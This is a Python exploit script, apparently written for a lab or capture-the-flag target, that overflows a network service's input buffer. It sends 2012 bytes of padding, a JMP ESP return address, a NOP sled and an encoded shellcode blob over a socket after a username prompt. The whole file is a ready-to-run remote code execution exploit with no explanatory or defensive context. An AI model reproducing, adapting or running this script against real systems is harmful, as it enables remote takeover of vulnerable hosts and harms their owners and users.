import socket, struct

shellcode =  b""
shellcode += b"\xb8\x8d\xdf\x8f\x99\xd9\xc1\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x83\xea\xfc\x31\x42\x0e"
shellcode += b"\x03\xcf\xd1\x6d\x6c\x33\x05\xf3\x8f\xcb\xd6"
shellcode += b"\x94\x06\x2e\xe7\x94\x7d\x3b\x58\x25\xf5\x69"
shellcode += b"\x55\xce\x5b\x99\xee\xa2\x73\xae\x47\x08\xa2"
shellcode += b"\x81\x58\x21\x96\x80\xda\x38\xcb\x62\xe2\xf2"
shellcode += b"\x1e\x63\x23\xee\xd3\x31\xfc\x64\x41\xa5\x89"
shellcode += b"\x31\x5a\x4e\xc1\xd4\xda\xb3\x92\xd7\xcb\x62"
shellcode += b"\xa8\x81\xcb\x85\x7d\xba\x45\x9d\x62\x87\x1c"
shellcode += b"\x16\x50\x73\x9f\xfe\xa8\x7c\x0c\x3f\x05\x8f"
shellcode += b"\x4c\x78\xa2\x70\x3b\x70\xd0\x0d\x3c\x47\xaa"
shellcode += b"\xc9\xc9\x53\x0c\x99\x6a\xbf\xac\x4e\xec\x34"
shellcode += b"\xa2\x3b\x7a\x12\xa7\xba\xaf\x29\xd3\x37\x4e"
shellcode += b"\xfd\x55\x03\x75\xd9\x3e\xd7\x14\x78\x9b\xb6"
shellcode += b"\x29\x9a\x44\x66\x8c\xd1\x69\x73\xbd\xb8\xe5"
shellcode += b"\xb0\x8c\x42\xf6\xde\x87\x31\xc4\x41\x3c\xdd"
shellcode += b"\x64\x09\x9a\x1a\x8a\x20\x5a\xb4\x75\xcb\x9b"
shellcode += b"\x9d\xb1\x9f\xcb\xb5\x10\xa0\x87\x45\x9c\x75"
shellcode += b"\x07\x15\x32\x26\xe8\xc5\xf2\x96\x80\x0f\xfd"
shellcode += b"\xc9\xb1\x30\xd7\x61\x5b\xcb\xb0\x87\x97\xe6"
shellcode += b"\x78\xf0\xa5\x08\x5a\x29\x23\xee\xf6\x39\x65"
shellcode += b"\xb9\x6e\xa3\x2c\x31\x0e\x2c\xfb\x3c\x10\xa6"
shellcode += b"\x08\xc1\xdf\x4f\x64\xd1\x88\xbf\x33\x8b\x1f"
shellcode += b"\xbf\xe9\xa3\xfc\x52\x76\x33\x8a\x4e\x21\x64"
shellcode += b"\xdb\xa1\x38\xe0\xf1\x98\x92\x16\x08\x7c\xdc"
shellcode += b"\x92\xd7\xbd\xe3\x1b\x95\xfa\xc7\x0b\x63\x02"
shellcode += b"\x4c\x7f\x3b\x55\x1a\x29\xfd\x0f\xec\x83\x57"
shellcode += b"\xe3\xa6\x43\x21\xcf\x78\x15\x2e\x1a\x0f\xf9"
shellcode += b"\x9f\xf3\x56\x06\x2f\x94\x5e\x7f\x4d\x04\xa0"
shellcode += b"\xaa\xd5\x34\xeb\xf6\x7c\xdd\xb2\x63\x3d\x80"
shellcode += b"\x44\x5e\x02\xbd\xc6\x6a\xfb\x3a\xd6\x1f\xfe"
shellcode += b"\x07\x50\xcc\x72\x17\x35\xf2\x21\x18\x1c"


host, port = '10.10.237.124', 9999
bad_chars = [


]
all_chars = bytearray(range(1,256))

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

username = b'Generic User'
next_prompt = b'\r\n'
new_eip = b'BBBB'
length = 3000
offset = 2012
nop_sled = b'\x90'*20
def p32(data):
        return struct.pack("<I",data)

jmp_esp = p32(0x62501503)
payload = b''.join([
b'A'*offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
])




with socket.socket() as s:
        s.connect((host,port))
        s.recv(1024)
        s.send(username + next_prompt)
        s.recv(1024)
        s.send(payload + next_prompt)
